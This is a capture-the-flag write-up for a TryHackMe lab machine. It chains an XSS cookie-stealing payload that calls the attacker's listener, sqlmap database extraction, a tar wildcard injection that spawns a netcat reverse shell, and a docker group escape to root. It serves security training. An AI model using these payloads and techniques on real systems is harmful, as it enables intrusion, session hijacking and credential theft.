---
title: The Marketplace - Writeup
---

_**Nov 13, 2020**_

[The Marketplace](https://tryhackme.com/room/marketplace) Writeup

## Recon :

```
bvr0n@kali:~/CTF/THM/Marketplace$ nmap -sC -sV 10.10.79.215
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## XSS :

The nmap scan show a `/robots.txt` with 1 entry `/admin` So we can Login or SignUp.
I tried SQLi in the login page but i found nothing. So signed up to the webapp.
New Listing page posts the data to home page. Here we can try XSS.

##### Payload :

```
<script>fetch("http://IP:8000/"+document.cookie)</script>test
```
Listen on a local server :

```
bvr0n@kali:~/Documents/Reverse_Shells$ python -m SimpleHTTPServer
```

You will notice that when you hit submit we get the cookie as request from the server, but we need the admin to click on this link so we report it to the admin and voila :

```
10.10.79.215 - - [12/Nov/2020 16:36:13] code 404, message File not found
10.10.79.215 - - [12/Nov/2020 16:36:13] "GET /token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUyMTY5NzV9.YaVjT0qw5rwwmaDs4-A0f8F3ftvGYqIAe-8hMoN66lo HTTP/1.1" 404 -
```

Change the token value in the storage section and you will get the admin panel.

## SQL Injection :

The `/admin?user=2` address is vulnerable to SQL Injection, We can test with this payload after the `user=2` `‘ or 1=1` and we get this error :

`Error: ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '‘ or 1=1' at line 1`

Now we know that it's running MySQL, Now we can use `sqlmap` :

```
bvr0n@kali:~$ sqlmap http://10.10.19.78/admin?user=3 --cookie='token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDUyODI4NjZ9.IgpK3J9x4W76CHNamc5WYhLahKx9Kr5AxMtqFgj0qTw' --technique=U --delay=2 -dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:58:06 /2020-11-13/

Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] 
[10:58:11] [INFO] testing connection to the target URL
[10:58:15] [INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')
[10:58:43] [INFO] target URL appears to have 4 columns in query
```
We successfully extracted the database, the `messages` table had a ssh password.

```
Table: messages
[5 entries]
+----+---------+---------+-----------+--------------------------------------------------------------------------------------------------+
| id | is_read | user_to | user_from | message_content                                                                                  |
+----+---------+---------+-----------+--------------------------------------------------------------------------------------------------+
| 1  | 1       | 3       | 1         | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed.| 
|    |         |         |           | You have been generated a new temporary password.\r\nYour new password is: ****************      |
+----+---------+---------+-----------+--------------------------------------------------------------------------------------------------+
```
And also extracted all the users hash.

```
Database: marketplace                                                                                                                                               
Table: users
[4 entries]
+----+--------------------------------------------------------------+----------+-----------------+
| id | password                                                     | username | isAdministrator |
+----+--------------------------------------------------------------+----------+-----------------+
| 1  | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | system   | 0               |
| 2  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | michael  | 1               |
| 3  | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | jake     | 1               |
| 4  | $2b$10$2iHEbf1uB1LvOlHyXvWfhedQgiS8pXIAIkMab0EhrssCtEZHUE2vy | admin    | 0               |
+----+--------------------------------------------------------------+----------+-----------------+
```


## Privilege Escalation :

##### User Michael :

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```
We can run `/opt/backups/backup.sh` as user `Michael`, Let's check the content of `backup.sh`

```
jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```
Tar wildcards is very dangerous, [Check Here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks) :

```
jake@the-marketplace:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 8080 >/tmp/f" > shell.sh
jake@the-marketplace:/opt/backups$ touch "./--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:/opt/backups$ touch "./--checkpoint=1"
```
```
bvr0n@kali:~$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.8.14.157] from (UNKNOWN) [10.10.70.189] 40246
$ id && whoami
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
michael
$
```

##### Upgrade Shell :

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
[Ctrl+Z]
bvr0n@kali:~$ stty raw -echo
bvr0n@kali:~$ fg 
michael@the-marketplace:/opt/backups$ export SHELL=bash
michael@the-marketplace:/opt/backups$ stty rows 38 columns 116
michael@the-marketplace:/home/marketplace$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```
User michael is in docker group, seems intresting :

```
michael@the-marketplace:/home/marketplace$ docker image ls
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        2 months ago        2.16GB
nginx                        latest              4bb46517cac3        3 months ago        133MB
node                         lts-buster          9c4cc2688584        3 months ago        886MB
mysql                        latest              0d64f46acfd1        3 months ago        544MB
alpine                       latest              a24bb4013296        5 months ago        5.57MB
```
We can abuse one of these images to get the root privileges, [Check This](https://gtfobins.github.io/gtfobins/docker/) :

```
michael@the-marketplace:/home/marketplace$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@9fe4ab0e0edd:/# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root@9fe4ab0e0edd:/#
```
##### Congratulations, you now have complete access to the system. Hope you enjoyed this guide. :)
